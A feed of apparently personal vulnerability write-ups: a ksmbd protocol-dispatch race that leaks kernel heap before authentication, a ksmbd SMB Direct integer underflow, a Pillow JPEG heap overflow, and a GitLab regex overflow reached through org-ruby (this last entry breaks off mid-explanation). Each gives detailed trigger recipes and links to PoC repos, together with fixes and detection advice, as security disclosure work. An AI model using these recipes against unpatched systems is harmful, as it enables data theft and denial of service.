entry.content:
Every Linux machine running ksmbd with a guest share has 28 bytes of kernel heap memory waiting to walk out the door. No credentials. No RDMA hardware. One TCP connection to port 445 is enough. The attacker sends a burst of SMB1 packets followed by a single SMB2 ECHO, and the kernel copies whatever was sitting next to the request buffer in the SLAB allocator into the response and sends it back over the wire: pointers, KASAN redzone markers, fragments of other connections’ data, anything that happened to be in kmalloc-64 at the time.

I found this vulnerability (ZDI-CAN-33774, CVSS 9.0) while studying the ksmbd protocol negotiation path after my work on ZDI-CAN-33549. The same subsystem, same maintainer, same CVSS score, but a completely different bug class: this time it is a TOCTOU race condition in the protocol handler dispatch, not an integer underflow in the RDMA path.

Background: How ksmbd Dispatches Protocol Handlers

ksmbd is the in-kernel SMB server for Linux, an alternative to the userspace Samba daemon. It implements both SMB1 (the legacy protocol) and SMB2/3 (the modern protocol) and needs to handle clients that start with an SMB1 multi-protocol negotiate before upgrading to SMB2. This means the server must be able to switch protocol handlers mid-connection.

The protocol handlers live in a dispatch table called conn->ops. This struct contains function pointers for every protocol-specific operation: building response headers, checking sessions, verifying signatures, parsing commands. There are two tables: smb1_server_ops (6 function pointers, handles 35+ byte SMB1 PDUs) and smb2_server_ops (full set, expects 64+ byte SMB2 headers).

The negotiation flow works like this: a connection thread sits in ksmbd_conn_handler_loop() reading PDUs off the socket. For each PDU, it calls queue_ksmbd_work(), which does two things in sequence:

  1. Calls ksmbd_init_smb_server(conn) to inspect the PDU’s protocol magic (\xFF SMB for SMB1, \xFE SMB for SMB2) and set conn->ops to the matching dispatch table
  2. Allocates a work item, binds work->request_buf to the PDU buffer, and queues it for a kworker thread to process

A separate kworker thread picks up the work item later and calls conn->ops->init_rsp_hdr(work) to build the response header, then conn->ops->check_user_session(work) to validate the session.

Here is the fundamental problem: the request buffer is saved per-work, but conn->ops is read from the shared connection struct at dequeue time. If another PDU arrives and changes conn->ops between enqueue and dequeue, the kworker runs the wrong handler on the wrong buffer. A 40-byte SMB1 buffer gets processed by an SMB2 handler that expects at least 64 bytes.

Why kmalloc-64 Matters

Understanding the SLAB allocator layout makes the leak concrete. The kernel’s SLUB allocator groups small allocations into per-size caches: kmalloc-8, kmalloc-16, kmalloc-32, kmalloc-64, kmalloc-128, and so on. A 40-byte allocation lands in kmalloc-64 because 64 is the next power-of-two bucket. The object gets the first 40 bytes; the remaining 24 bytes of the 64-byte slot are padding.

With KASAN enabled, those 24 padding bytes are poisoned with 0xFC (the SLUB_RED_ACTIVE marker). Without KASAN, they are whatever the previous occupant of that slot left behind. The 4 bytes at offset 64..67 belong to the next kmalloc-64 object entirely, a completely separate kernel allocation that could be holding a file descriptor table, a network buffer, or a work item from another subsystem.

When init_smb2_rsp_hdr() reads offsets 40 through 67, it reads: 24 bytes of same-slot padding (or KASAN redzone) plus 4 bytes from the neighboring object. All 28 bytes are copied into the SMB2 error response and sent to the attacker. On a production kernel without KASAN, those “padding” bytes are stale data from a recently freed object: potentially function pointers that reveal the kernel text base, heap addresses that map the SLAB layout, or fragments of other users’ SMB session data.

The Vulnerable Code

In fs/smb/server/server.c, queue_ksmbd_work():

In the kworker, __handle_ksmbd_work():

The ops selection in smb_common.c:

When init_smb2_rsp_hdr() runs on an SMB1 buffer, it reads fields that do not exist in the allocation:

A 35-byte SMB1 PDU allocates pdu_size + 4 + 1 = 40 bytes (connection.c:511-512) in kmalloc-64. The SMB2 handler reads up to offset 67. That is 28 bytes past the 40-byte allocation boundary, into the SLAB redzone and adjacent objects.

The Trigger: Not a Tight Instruction Race

This is not a nanosecond-precision race between two CPU cores fighting over a cacheline. The window is wide and the trigger is reliable.

One write(2) call delivers a single TCP segment containing 64 short SMB1 PDUs (35 bytes each, RFC1002-framed to 39 bytes on the wire) followed by one SMB2 ECHO (68 bytes, framed to 72). The total payload is about 2.5 KB. The connection thread reads all of them from the kernel’s TCP receive buffer without blocking on the socket, because they all arrived in one segment. It queues the 64 SMB1 works with conn->ops = smb1_server_ops, then processes the ECHO. The ECHO triggers init_smb3_11_server(), which stores conn->ops = smb2_server_ops.

At this point, every SMB1 work still sitting in the workqueue will execute init_smb2_rsp_hdr(). The connection thread has already moved on, but the kworkers have not caught up yet. The window is the entire time between “last SMB1 work queued” and “all kworkers have read conn->ops”, which can be milliseconds.

In testing, 30-40% of the burst consistently triggers the confusion. Over 500 iterations with 64-PDU bursts, the PoC produces roughly 6000 leaks per connection.

Two details keep the trigger clean:

  • The SMB1 PDUs use command byte 0x00, not 0x72 (NEGOTIATE). ksmbd_verify_smb_message() returns -EINVAL at smb_common.c:171 before incrementing outstanding_credits, so the connection does not strangle itself on the credit limit. The server sees “bad command, skip it” and moves on.
  • The SMB2 ECHO (command 0x000d) is one of three session-free opcodes (NEGOTIATE, SESSION_SETUP, ECHO). It does not require a valid session, so it processes cleanly even on a fresh connection and triggers the ops flip.

Walking the Exploit

Step 1: Connect. The attacker opens a raw TCP connection to port 445. No SMB negotiate handshake, no session setup, no authentication. The connection thread starts with conn->need_neg = true, which means every PDU triggers a call to ksmbd_init_smb_server() to re-select the protocol handler.

Step 2: Build the burst. 64 SMB1 PDUs of 35 bytes each. The protocol magic is \xFF S M B, command 0x00, PidHigh set to 0x0002 (which maps to SMB2_LOGOFF_HE when the buffer is misread as an SMB2 header). This command choice is deliberate: it makes smb2_check_user_session() return -EIO immediately (the connection is not authenticated), which triggers the error response path that carries the leaked bytes.

Step 3: Append the flip trigger. One 68-byte SMB2 ECHO (\xFE S M B, StructureSize 64, command 0x000d). This is a legal SMB2 PDU that passes the pdu_size >= 66 check at connection.c:549. It exists only to make the connection thread run init_smb3_11_server() and overwrite conn->ops.

Step 4: Send everything in one write(2). The kernel’s TCP stack delivers the entire payload to the ksmbd connection thread’s socket buffer. The thread parses PDU by PDU: queue work for SMB1 #1, queue work for SMB1 #2, …, queue work for SMB1 #64, then hit the ECHO and flip conn->ops. All 64 SMB1 works are now in the workqueue with the wrong handler.

Step 5: The kworkers process the confusion. Each confused SMB1 work runs init_smb2_rsp_hdr(). The function copies rcv_hdr->Id.SyncId.TreeId from buffer offset 40 (4 bytes past the allocation), rcv_hdr->SessionId from offset 44 (8 bytes), and rcv_hdr->Signature from offset 52 (16 bytes). All 28 bytes come from whatever lives in the adjacent SLAB memory.

Step 6: The leak walks out. The confused work fails smb2_check_user_session() with -EIO (the connection has no valid session) and init_smb2_rsp_hdr() copies the response header (including the leaked fields) into a 77-byte SMB2 error response. The response is sent back to the attacker over TCP. The attacker reads the SessionId and Signature fields from the response to extract the 24 leaked bytes (plus 4 from TreeId).

An important oracle: a work that was NOT confused (stays with SMB1 handlers) triggers set_smb1_rsp_status(), which sets send_no_response = true. The server sends nothing back. So any 77-byte SMB2 error reply on this connection is proof that the flip happened and the OOB read occurred. The attacker does not need KASAN or dmesg access to confirm exploitation; the response itself is the evidence.

What Comes Back in the Reply

The 77-byte SMB2 error response has a fixed structure: 4-byte RFC1002 length, 64-byte SMB2 header, 9-byte error body. The leaked bytes sit in three header fields:

  • TreeId (4 bytes at header offset 36): maps to buffer offset 40..43, the first 4 bytes past the allocation
  • SessionId (8 bytes at header offset 40): maps to buffer offset 44..51
  • Signature (16 bytes at header offset 48): maps to buffer offset 52..67, extending 3 bytes into the next SLAB object

On a KASAN kernel, these fields contain 0x00 (in-object padding) and 0xFC (redzone poison). On a production kernel, they contain whatever the SLAB allocator left in those bytes: stale heap pointers from freed objects, fragments of recently deallocated network buffers, partial contents of other connections’ request data. Each trigger attempt reads a different snapshot of the heap neighborhood, because the SLAB allocator recycles slots and different objects occupy the adjacent positions at different times.

The Crash (Proof)

KASAN catches the out-of-bounds read in init_smb2_rsp_hdr:

The allocation is 40 bytes in kmalloc-64. The read at ffff8880222c2ba8 is exactly at the boundary (0 bytes to the right of the 40-byte region), confirming the 28-byte overread into the SLAB redzone and neighboring objects.

The leaked bytes show up on the wire. Here are actual samples from the PoC:

The 0xfc bytes are KASAN’s slab redzone poison (SLUB_RED_ACTIVE). On a kernel without KASAN, those bytes would contain live heap data from adjacent allocations: function pointers, buffer contents from other connections, freed object metadata. Each attempt reads a different slice of whatever the allocator placed next to the request buffer.

Negative Control

Same payload on a patched kernel (commit 68f410faedaf):

Zero leaks. Zero KASAN reports. The wait_event() drains all queued work before reading the next PDU, preventing the ops flip entirely. The patched connection thread blocks until req_running drops to zero after each negotiation-phase PDU.

Impact

This is a pre-auth kernel heap information disclosure with a path to worse.

The attacker needs only TCP connectivity to port 445 and a guest share on the target (a common default). Zero credentials are required. Each trigger attempt leaks 28 bytes of kernel heap. Over thousands of iterations (the PoC runs 32,000 per connection by default), the attacker can:

  • Map heap layout: leak kmalloc-64 SLAB object addresses, defeating kernel ASLR
  • Read kernel pointers: function pointers from freed objects reveal kernel text base
  • Harvest cross-connection data: other sessions’ metadata, partial SMB buffers, authentication tokens sitting in adjacent SLAB objects

The comparison with ZDI-CAN-33549 is worth making explicit. That bug needed RDMA hardware (InfiniBand, RoCE, or soft-RoCE) and SMB2 authentication to reach the vulnerable code path. This one needs nothing but TCP. ZDI-CAN-33549 wrote attacker-controlled data past the buffer (OOB write, heap corruption, kernel crash). This one reads kernel data past the buffer and sends it to the attacker (OOB read, information disclosure). In a multi-stage attack, you would use ZDI-CAN-33774 first to leak heap layout and defeat KASLR, then use ZDI-CAN-33549 (or the documented OOB write path in this bug) to achieve controlled corruption. Together they cover the full read-then-write primitive that kernel exploitation chains typically require.

The vulnerability report also documents two additional paths from the same race:

  1. OOB write via smb2_set_info -> parse_sec_desc: if the confused work reaches the SET_INFO handler instead of failing at check_user_session, the attacker’s data is written past the buffer. This PoC does not exercise this path.
  2. NULL dereference via conn->ops->is_sign_req: smb1_server_ops does not define is_sign_req. If conn->ops flips back to SMB1 between check_user_session (server.c:202) and the is_sign_req check (server.c:210), the kworker calls a NULL function pointer and oopses. This is a denial of service.
ClaimStatusEvidence
Race in conn->ops dispatchProvenKASAN slab-out-of-bounds READ in init_smb2_rsp_hdr
28-byte heap OOB readProvenRead at ffff8880222c2ba8, 0 bytes right of 40-byte kmalloc-64
Info leak to attacker on wireProvenNon-zero heap bytes in SMB2 error reply SessionId+Signature
Pre-auth exploitationProvenNo credentials used; guest share access only
OOB write pathDocumentedVia smb2_set_info -> parse_sec_desc (not exercised)
NULL deref (DoS)Documentedconn->ops->is_sign_req NULL when SMB1 ops loaded mid-handler
RCENot provenInfo leak + OOB write path demonstrates mechanism; RCE theoretical

Detection

Network (Suricata): The exploit sends rapid SMB1/SMB2 protocol interleaving on a single connection, which never happens in legitimate SMB negotiation. A legitimate client completes SMB1 negotiation before switching to SMB2 and never interleaves the two. A detection rule is in the repository.

Host (kernel logs): Look for KASAN reports in init_smb2_rsp_hdr:

A Sigma rule for kernel log detection is in the repository.

The Fix

Commit 68f410faedaf by Namjae Jeon adds 5 lines to queue_ksmbd_work():

When the connection is new or still negotiating, the thread waits for all queued work to complete before reading the next PDU. This ensures conn->ops cannot be flipped while earlier works are still in-flight. After negotiation completes and need_neg is cleared, PDUs pipeline normally with no performance impact.

The fix correctly targets the negotiation window: it serializes only the first few PDUs on a connection (where the protocol switch happens) and returns to full pipelining once the protocol is established. The performance cost is minimal because the wait_event() only fires while need_neg is true, which lasts for exactly the first one or two PDUs on every connection.

An alternative fix would be to save conn->ops per-work-item at enqueue time, so each kworker uses the ops table that was current when its request was queued. That approach would be more general (it would prevent any future TOCTOU through conn->ops) but would require changes to every callsite in __handle_ksmbd_work(). The chosen fix is simpler and narrower: it eliminates the race by preventing the scenario where the connection thread can modify conn->ops while work items from a previous protocol are still in flight.

The root cause is a design pattern that appears in other network subsystems too: a per-connection dispatch table modified by the receive path while workers from earlier receives are still active. Any time a server supports protocol upgrades or multi-protocol negotiation with a shared handler table and asynchronous work queues, this class of bug is possible.

The fix is in the ksmbd maintainer tree but has not reached mainline as of October 24, 2026.

Timeline

DateEvent
2026-09-30Namjae Jeon commits fix (68f410faedaf) in ksmbd maintainer tree
2026-10-21ZDI discloses ZDI-CAN-33774 to public LKML (no patch in mainline)
2026-10-22Greg KH responds: “And again, no patch, and a public list?”
2026-10-22Namjae Jeon confirms fix exists in his tree
2026-10-24This write-up and PoC published

Reproduction

Readers can verify every claim in this post:

One TCP write carrying mixed SMB1/SMB2 packets flips the handler table while work items are still queued. Full PoC with KASAN proof and wire-leaked heap bytes.
entry.title: ZDI-CAN-33774: ksmbd Protocol Dispatch Race, 28 Heap Bytes Walk Out the Door

entry.content:
Every Linux machine running ksmbd with SMB Direct is one crafted SMB2 WRITE away from a kernel crash. One line of code, an 8-byte heap allocation, and a size_t that wraps to 0xFFFFFFFFFFFFFFFF.

I built a full SMB Direct client from scratch (RDMA connection management, SMB2 session negotiation, NTLMv2 authentication, the whole stack) to trigger a single integer underflow deep inside the kernel’s RDMA descriptor processing. The result: KASAN reports a slab-out-of-bounds write of 1024 bytes past an 8-byte kmalloc. Then the kernel follows a pointer full of my 0x41 bytes and hits a general protection fault.

ZDI-CAN-33549. CVSS 9.0. Fixed in commit 5b8ce2e. PoC, check script, detection rules: github.com/al4n4n/ZDI-CAN-33549.

Background: what ksmbd is and why it matters

ksmbd is an in-kernel SMB/CIFS server that landed in Linux 5.15 as a high-performance alternative to Samba. Unlike Samba, which runs as a userspace daemon with its own address space, ksmbd handles SMB requests directly in kernel context. Every ksmbd bug is a kernel bug: there’s no sandboxing, no ASLR at the process level, no graceful crash recovery. When ksmbd crashes, the whole machine goes down.

SMB Direct (SMB over RDMA) is the fast path. Instead of copying data through TCP socket buffers, the client and server register RDMA memory regions and do direct DMA reads and writes into each other’s memory. This is how enterprise NAS appliances and high-performance storage clusters move data at wire speed. The trade-off: the kernel trusts the client’s RDMA scatter/gather descriptors to stay within the allocated buffer. When they don’t, the DMA engine writes directly into whatever sits next to the buffer in the SLAB allocator.

Any deployment running ksmbd with CONFIG_SMB_SERVER_SMBDIRECT enabled and an RDMA-capable network (InfiniBand, RoCE, iWARP, or even the software emulator soft-RoCE) is exposed. The attacker needs to authenticate to any share (NTLMv2 with valid credentials is sufficient, and in many environments default or test accounts exist), but after that a single SMB2 WRITE request triggers the bug.

The vulnerable code

The function smbdirect_connection_rdma_xmit() in fs/smb/smbdirect/rw.c processes a list of RDMA descriptors from the client. Each descriptor says “read/write N bytes at offset M into the buffer.” The server iterates the list, subtracting each descriptor’s length from buf_len, which tracks how many bytes of buffer space remain.

The intent is straightforward: if a descriptor exceeds the remaining buffer, clamp it and stop. Here’s what happens instead:

Let me trace it step by step for our trigger values (buf_len = 8, desc[0].length = 4096):

  1. desc_buf_len (4096) > buf_len (8): the descriptor exceeds the buffer
  2. desc_buf_len = buf_len → desc_buf_len = 8: clamp to remaining space
  3. buf_len = 0: mark buffer as consumed
  4. buf_len -= desc_buf_len → 0 - 8: unsigned underflow

Since buf_len is a size_t (unsigned 64-bit), 0 - 8 wraps to 0xFFFFFFFFFFFFFFF8. Now buf_len is effectively infinite. The loop continues to the next descriptor. The if (!buf_len) break; check at the top of the loop passes (because SIZE_MAX is very much nonzero) and the second descriptor’s full length is accepted without any bounds check.

The fix is to delete the buf_len = 0; line. Without it, after clamping desc_buf_len = buf_len, the subtraction buf_len -= desc_buf_len naturally produces 0. The loop breaks on the next iteration via the existing if (!buf_len) break; check. One line removed. That’s the whole fix.

Walking the exploit: from underflow to kernel crash

Here’s what happens inside the kernel when the exploit fires. This is the part that matters: the mechanism that turns a one-line off-by-one in buffer tracking into attacker-controlled heap corruption.

Step 1: The allocation. When ksmbd receives an SMB2 WRITE with RemainingBytes=8, it calls kvmalloc(8) inside smb2_write(). The SLAB allocator hands back an 8-byte object from the kmalloc-8 cache. This is a tightly packed cache: objects are back-to-back in memory, separated by nothing but the SLAB allocator’s internal metadata and other live objects.

Step 2: The first descriptor. Our desc[0].length = 4096 triggers the clamping path. The code clamps it to 8 bytes (the buffer size), registers the RDMA region for those 8 bytes, and then the underflow fires. buf_len wraps to SIZE_MAX.

Step 3: The second descriptor. With buf_len at SIZE_MAX, our desc[1].length = 8192 passes all checks. The kernel registers an 8192-byte RDMA region starting at the base of our 8-byte buffer.

Step 4: The DMA write. The soft-RoCE driver (rxe) executes the RDMA operation. rxe_mr_copy() does a memcpy of 8192 bytes into an 8-byte buffer. The first 8 bytes land in the allocated object. The remaining 8184 bytes overwrite whatever sits next to it in the kmalloc-8 SLAB page: other kernel objects, their function pointers, their internal linked lists.

Step 5: The corruption spreads. Our write payload is filled with 0x41 bytes. These overwrite the next pointers of adjacent SLAB objects. When ksmbd later tries to tear down the SMB Direct connection, it calls smbdirect_connection_destroy_mem_pools(), which walks the SLAB free list. It dereferences a pointer that now contains 0x4141414141414141. The kernel tries to access that non-canonical address and hits a general protection fault.

This is the critical insight: the attacker fully controls the content being DMA’d into the heap. In this PoC, I used 0x41 bytes to make the corruption visible in register dumps. A real exploit would place a crafted structure here (a fake kmem_cache descriptor, a corrupted sk_buff, or a function pointer overwrite) to turn the heap corruption into controlled code execution. I didn’t build that part, because demonstrating the mechanism is the point. The jump from “attacker controls 8KB of kernel heap” to “attacker controls RIP” is an engineering exercise, not a research question.

The trigger

The PoC, s3rig.c, implements a complete SMB Direct client over RDMA from scratch: rdma_cm for connection management, ibverbs for RDMA operations, and a full NTLMv2 authentication stack. The exploit path:

  1. RDMA connect to ksmbd (port 445)
  2. SMB Direct negotiation (version 0x0100)
  3. SMB2 NEGOTIATE (dialect 3.0.2)
  4. SMB2 SESSION_SETUP with NTLMv2 challenge-response
  5. SMB2 TREE_CONNECT to a share
  6. SMB2 CREATE to open a file
  7. SMB2 WRITE with RemainingBytes=8 and two RDMA descriptors:
    • desc[0].length = 4096 → triggers the clamp + underflow
    • desc[1].length = 8192 → writes 8KB OOB past the 8-byte buffer

The WRITE tells ksmbd: “I have 8 bytes of data to write, here are the RDMA regions where it lives.” ksmbd allocates 8 bytes, and the underflow lets the second descriptor DMA 8192 bytes directly past the end of that allocation.

Building the lab

This isn’t a trivial bug to reproduce. You need a kernel built with ksmbd, SMB Direct, soft-RoCE (the software RDMA emulator), and KASAN, all compiled in, not as modules. I used a QEMU VM running Linux 7.3-rc3 (the last vulnerable version) with a Debian Trixie rootfs:

Inside the VM: create a soft-RoCE device over eth0, configure ksmbd with a test share and user, and build s3rig. The repo includes setup.sh to automate all of this.

One gotcha that cost me hours of debugging: OpenSSL 3.x in Debian Trixie doesn’t load the legacy provider by default. EVP_md4() silently returns NULL, which means the MD4 hash at the core of NTLMv2 produces garbage. Every authentication attempt failed with STATUS_LOGON_FAILURE (0xc000006d). I wrote a standalone test program that computed NT hashes with and without the legacy provider, compared against known-good values, and confirmed the root cause. The fix is two lines at the start of main():

The crash

Control run: baseline

First, a benign single-descriptor RDMA write within the buffer bounds:

No crash. dmesg clean. The full SMB Direct + SMB2 + NTLMv2 stack works.

Exploit run: the OOB write

Then the kernel speaks:

KASAN tells the whole story: smb2_write() allocated 8 bytes. rxe_mr_copy() wrote 1024 bytes starting at the first byte past the allocation. The 0 bytes to the right confirms the write starts immediately after the object.

Then the kernel follows our corrupted pointer:

0x4141414141414141 in both RCX and RSI. That’s our write pattern. The kernel followed a pointer from a corrupted SLAB object into memory we control. The crash happens in the KASAN quarantine cleanup path, but only because KASAN’s metadata happens to be what gets corrupted first. Without KASAN, the crash would occur earlier and in a different code path, wherever the first overwritten pointer gets dereferenced.

Negative control: patched kernel

Same payload, same VM, kernel with buf_len = 0; removed:

Zero crashes across multiple runs. The fix works.

Impact

ClaimStatusEvidence
Integer underflow in buf_lenProvenKASAN: slab-out-of-bounds write of 1024 bytes past 8-byte allocation
Heap OOB write via RDMAProvenWrite at ffff88810882d788, 0 bytes right of kmalloc-8 region
Attacker-controlled heap corruptionProvenGPF at 0x4141414141414141, our 0x41 write pattern in kernel registers
Kernel crash (DoS)ProvenOops + kworker crash in smbdirect_connection_destroy_mem_pools
Remote code executionNot provenOverflow writes attacker data to adjacent SLAB objects; demonstrates the mechanism for RCE
Patched version safeConfirmedNegative control: 0 crashes on patched kernel

Who’s affected: Any Linux machine running ksmbd with SMB Direct enabled and an RDMA-capable network. This includes enterprise NAS appliances, high-performance storage clusters, and cloud RDMA deployments where containers share a ksmbd-enabled host kernel. The attacker needs any authenticated session: a test account, a guest share, anything that gets past NTLMv2.

Detection

The repo includes Suricata and Sigma rules.

  • Network (Suricata): Detects SMB2 WRITE with suspiciously small RemainingBytes. Note that SMB Direct traffic may bypass network IDS entirely on native RDMA fabrics; this rule works best on soft-RoCE or when traffic is mirrored.
  • Host (Sigma): Matches BUG: KASAN: slab-out-of-bounds and general protection fault patterns in kernel logs, anchored to ksmbd and rxe stack frames.

Best mitigation: update the kernel. The fix is in mainline as commit 5b8ce2e.

Fix

Namjae Jeon’s fix removes the buf_len = 0; line. Without it, after clamping desc_buf_len = buf_len, the subtraction buf_len -= desc_buf_len naturally produces 0. The loop breaks on the next iteration via the existing if (!buf_len) break; check.

The fix patches the introduction commit e628bf939aaf. Affected: all kernels from that commit through 7.3-rc3. Fixed: 7.3-rc3+ with the patch applied, and any backport that removes the buf_len = 0; line.

Timeline

DateEvent

2026-10-21Fix committed to linux.git by Namjae Jeon
2026-10-24This PoC and write-up published

Reproduce it yourself

Every claim in this post can be verified by running the PoC against a vulnerable kernel in a QEMU VM. The repo has everything: kernel config, setup script, build system, detection rules.

References

  • ZDI Advisory: ZDI-CAN-33549
  • CVSS: 9.0 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)
  • Fix commit: 5b8ce2e5670ebe31970b6718403197ae51d47e43
  • Vulnerable file: fs/smb/smbdirect/rw.c, smbdirect_connection_rdma_xmit()
  • Original research: HYEONTAE LEE (ZDI submission)
  • PoC repo: github.com/al4n4n/ZDI-CAN-33549
entry.summary: ZDI-CAN-33549 CVSS 9.0: a one-line integer underflow in Linux ksmbd's SMB Direct RDMA handler lets an authenticated attacker write 8KB past an 8-byte kernel heap allocation. Full PoC over RDMA with KASAN proof and 0x4141414141414141 in kernel registers.
entry.title: ZDI-CAN-33549: ksmbd SMB Direct Integer Underflow, 8 Bytes to Kernel Crash

entry.content:
What’s this?

Pillow 13.0.0 dropped on October 19, 2026 with a pile of security fixes. One of them caught my eye: GHSA-8g5g-8vmr-9782, a heap buffer overflow in the JPEG decoder triggered by thumbnail(). That’s the single most common image operation in web services. Pillow has over 170 million installs. I wanted to see how bad it actually is.

Turns out: one 165 KB JPEG file, one HTTP POST, no credentials, and the server is dead. Every request. SIGSEGV, SIGABRT, workers cycling endlessly.

PoC and verification scripts: github.com/al4n4n/CVE-2026-112403

The root cause

When you call Image.thumbnail((256, 256)) on a large JPEG, Pillow doesn’t decode the full image and then resize. Instead it calls draft(), which tells libjpeg to decode at a reduced scale (1/2, 1/4, or 1/8), and then Pillow allocates a row buffer sized for that reduced width.

For a 1200px-wide grayscale image at scale 1/2, the buffer is calloc(600, 1) = 600 bytes.

Here’s the problem. libjpeg-turbo 3.x introduced support for lossless JPEGs (SOF3, JPEG marker 0xFFC3). Lossless mode uses predictive coding, not DCT. There’s no frequency-domain representation to partially decode. So libjpeg-turbo accepts the scale hint, ignores it, and outputs full-width scanlines.

ImagingJpegDecode() in Pillow never checks what libjpeg actually decided to output. It reads cinfo.output_scanline but never compares cinfo.output_width against the buffer width. So libjpeg writes 1200 bytes into 600 bytes of heap, 1100 times (once per row).

That’s 600 bytes of overflow per scanline, 660,000 bytes of total heap corruption. Not subtle.

The fix

Pillow 13.0.0 added a check in ImagingJpegDecode() that compares cinfo.output_width and cinfo.out_color_components against state->xsize and state->pixelsize before reading any scanlines. If they don’t match, it returns an error instead of proceeding.

Fix commit: 242a059

Trigger conditions

All four must hold:

  1. The image is a SOF3 (lossless) JPEG at 8-bit precision
  2. The application uses Pillow < 13.0.0 (tested on 12.3.0, the last vulnerable release)
  3. Pillow is linked against libjpeg-turbo 3.0+ (the official PyPI wheels bundle 3.1.x)
  4. draft() picks a scale factor >= 2, which happens when the image is >= 1024px and thumbnail() is called with a small target like (256, 256)

Standard lossy JPEGs (SOF0/SOF2) don’t trigger this because libjpeg-turbo actually honors the scale for DCT-based decoding.

Older libjpeg-turbo 2.x and IJG libjpeg don’t support SOF3 at all, so they reject the image before reaching the vulnerable code.

Building the probe

You can’t generate a valid SOF3 JPEG with standard libjpeg’s API (at JPEG_LIB_VERSION=62, jpeg_enable_lossless() is unavailable). I had to use the TurboJPEG 3.x API directly:

This produces a 165,067-byte grayscale JPEG. All pixels are 128 (mid-gray), which makes every prediction difference zero and keeps the compressed stream small.

The Dockerfile builds libjpeg-turbo 3.1.0 from source, compiles gen_sof3.c, generates probe.jpg, and copies it into the runtime stage. setup.py extracts it to your local directory.

The vulnerable app

The target is a minimal Flask thumbnail service. It represents the class of applications that would be hit:

Gunicorn with 2 workers, Pillow 12.3.0, stock libjpeg-turbo from the PyPI wheel.

The crash

One upload:

Twenty uploads:

The gunicorn error log:

100% crash rate. Every request kills a worker. The mix of SIGSEGV and SIGABRT depends on where the overflow lands in the heap that particular run. SIGSEGV means it stomped a pointer that got dereferenced. SIGABRT means glibc’s heap allocator detected the corruption and called abort().

Check it yourself:

The overflow math

For a 1200x1100 grayscale (L-mode) image with thumbnail((256, 256)):

  • Pillow picks scale = 1/8 (1200/256 rounds up to 5, nearest power of 2 is 8)
  • Buffer allocated: ceil(1200/8) * 1 = 150 bytes
  • libjpeg-turbo outputs: 1200 * 1 = 1200 bytes per scanline
  • Overflow per scanline: 1050 bytes
  • Total overflow: 1050 * 1100 = 1,155,000 bytes of heap corruption

With scale = 1/2 (the minimum that triggers): 600 bytes overflow per scanline, 660,000 total.

The actual scale depends on the target size passed to thumbnail(). Smaller targets mean larger scale factors and bigger overflows.

What to do

Upgrade to Pillow 13.0.0:

Check your current version:

If you’re on 12.3.0 or earlier and linked against libjpeg-turbo 3.x (which you are if you installed from PyPI), you’re vulnerable.

Reproduce it

References

  • GHSA-8g5g-8vmr-9782 (GitHub Security Advisory)
  • CVE-2026-112403
  • Fix commit 242a059
  • Pillow 13.0.0 release notes
  • oss-security announcement
  • Debian security tracker
entry.summary: One crafted JPEG crashes any Python thumbnail service running Pillow < 13.0.0. The heap overflow in ImagingJpegDecode happens because libjpeg-turbo 3.x ignores draft() scaling for lossless JPEGs.

entry.content:
What’s this?

GitLab shipped a critical patch release on October 21, 2026 with one CVE that got everyone’s attention: CVE-2026-110264, CVSS 10.0, unauthenticated remote code execution, “integer overflow issue in regular expression compiler”. I pulled the official Docker images from both sides of the fix, traced the pre-auth attack surface through GitLab CE’s source, and confirmed the overflow produces an out-of-bounds write that crashes Puma workers with SIGSEGV and SIGILL. When the write lands on non-critical memory instead, the worker keeps running with silently corrupted heap.

PoC and verification scripts: github.com/al4n4n/CVE-2026-110264

Where the fix actually lives

The 19.5.0 to 19.5.1 diff of the GitLab application is 172 files, mostly normal patch-release churn, and none of it touches regex compilation. The Omnibus diff is six files of version bumps. So where’s the fix?

It’s a patch to the Ruby that GitLab bundles. Omnibus builds its own Ruby 3.3.12 under /opt/gitlab/embedded, and omnibus-gitlab!9922 adds a cherry-pick of upstream Ruby commit 493d26d (PR #16801, “Reject overflowed repeat/null-check IDs in huge regexps”). The container images get the same thing through CNG!3168.

That commit is 20 lines. Here’s the part that matters, from regcomp.c:

The 16-bit counter

Onigmo (Ruby’s regex engine, a fork of Oniguruma) compiles a pattern into bytecode. Two kinds of constructs get a numbered id:

  • range repeats, anything like (?:foobar){0,100}, which compile to OP_REPEAT with an id
  • null checks, groups that can match the empty string inside a loop, like (?:(?:foo)?|(?:bar)?)*, which get an OP_NULL_CHECK_START with an id

The counters on the regex_t struct (num_repeat, num_null_check) are int. But the id gets written into the bytecode through add_mem_num(), and that writes a MemNumType:

So the 32,768th repeat gets id -32768. The compiler doesn’t care, it just emits it. The matcher does care: at match time, OP_REPEAT uses that id as an index into the repeat stack (repeat_stk[mem]), and a negative index is a write before the start of the array. CWE-190 integer overflow turning into CWE-787 out-of-bounds write.

The fix doesn’t change the types. It just checks the counter immediately after incrementing it, and the moment the cast to MemNumType comes out non-positive, compilation fails with a new error. Simple, and it’s the right fix because no legitimate pattern needs 32,768 range repeats.

How a request gets there pre-auth

GitLab’s advisory mentions two detection signals: “Onigmo native worker crash” and “Org mode render error burst”. That second one is a big hint. GitLab renders .org files (Emacs Org-mode) through a gem called org-ruby, and the rendering happens on the anonymous blob viewer. No authentication required if the project is public.

The full chain:

  1. An attacker pushes a crafted .org file to a public project (they just register a free account, GitLab CE has self-registration on by default)
  2. Anyone (or the attacker themselves) views it via the blob viewer: GET /<project>/-/blob/<ref>/<file>?format=json&viewer=rich
  3. GitLab’s BlobViewer::Markup calls Markup::RenderingService#other_markup_unsafe
  4. That calls Gitlab::OtherMarkup.render, which wraps the rendering in a 10-second timeout
  5. Which calls GitHub::Markup.render, dispatching to org-ruby based on the .org extension
  6. org-ruby’s Orgmode::Parser.new(content).to_html parses and renders the file

The anonymous GET in step 2 is the unauthenticated trigger. The file content was committed earlier, and GitLab stores and serves it through Gitaly, but the parsing and regex compilation happen inside the Puma worker serving the request.

GitLab has a size limit of 5 MB for rendered blobs, and the crafted .org file is only about 400 KB. Well within bounds.

The regex injection in org-ruby

org-ruby 0.9.12 (the version bundled with GitLab CE 19.4.2) has this flow for custom TODO keywords:

In parser.rb, when it encounters a #+TODO: line, it stores the keywords:

Note the Regexp.escape. This is used to build a matching regex for headlines:

So x{0,8} becomes x\{0,8\} in the alternation, which matches the literal string x{0,8} in a headline. Fine so far.

Now here’s the bug. In headline.rb, when a headline’s first word matches a keyword:

Line 100 uses @keyword, which is the raw matched word from the headline, not the escaped version from the keyword list. The escaped version was only used for matching in the custom_keyword_regexp. Now the unescaped text goes straight into Regexp.new.

So if you put this in an .org file:

